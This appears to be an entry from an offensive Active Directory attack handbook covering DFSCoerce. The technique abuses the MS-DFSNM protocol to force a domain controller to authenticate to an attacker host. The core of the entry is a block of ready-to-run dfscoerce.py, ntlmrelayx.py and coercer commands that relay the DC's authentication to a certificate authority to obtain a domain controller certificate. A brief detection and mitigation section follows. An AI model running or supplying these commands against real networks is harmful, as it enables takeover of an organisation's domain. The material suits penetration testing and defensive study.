---
title: "Attack #77 — DFSCoerce MS-DFSNM Coercion"
description: "DFSCoerce abuses the MS-DFSNM (Distributed File System Namespace Management) protocol to coerce a target machine (typically a DC) into authenticating to…"
category: active-directory
subcategory: "Advanced & Post-Exploitation"
tags: ["active-directory", "adcs", "ntlm", "relay"]
tools: []
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Ten/🔷 Attack #77 — DFSCoerce MS-DFSNM Coercion.md"
---
# 🔷 Attack #77 — Coercion via DFSCoerce / MS-DFSNM

***

## 📖 How It Works

DFSCoerce abuses the **MS-DFSNM** (Distributed File System Namespace Management) protocol to coerce a target machine (typically a DC) into authenticating to an attacker-controlled host. It's functionally similar to PetitPotam (#41) and PrinterBug (#42) — a coercion technique that feeds into NTLM relay chains (ESC8, RBCD, etc.). DFSCoerce requires authentication but works on fully patched DCs where PetitPotam's unauthenticated variant has been fixed.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Any domain user credentials** | Authentication required |
| **DFS role installed on target** | Default on DCs in many environments |
| **Relay target** | ADCS, LDAP, etc. |

***

## 💻 Full Commands

```bash
# ── DFSCoerce ─────────────────────────────────────────────────────────────────
python3 dfscoerce.py -u low_user -p 'Password1' -d corp.local \
  LISTENER_IP DC01.corp.local

# ── Combined with ESC8 ───────────────────────────────────────────────────────
# Terminal 1:
ntlmrelayx.py -t http://CA01.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
# Terminal 2:
python3 dfscoerce.py -u low_user -p 'Password1' -d corp.local ATTACKER_IP DC01.corp.local

# ── Coercer (all-in-one — includes DFSCoerce) ────────────────────────────────
coercer coerce -u low_user -p 'Password1' -d corp.local \
  -l LISTENER_IP -t DC01.corp.local --filter-protocol-name MS-DFSNM
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4624** | Security Log | DC authenticating to unexpected workstation |

***

## 🔗 Attack Chain Context

```
[DFSCoerce] ──→ NTLM Coercion via MS-DFSNM → relay to ADCS/LDAP
         │
         ├──→ 🔗 Alternative coercion when PetitPotam is patched
         ├──→ 🔗 Chains with: ESC8 (#33), RBCD (#17), UD (#15)
         └──→ 💀 Defeated by: block outbound NTLM from DCs, enable EPA
```

***

> ✅ **Attack #77 — DFSCoerce complete.**
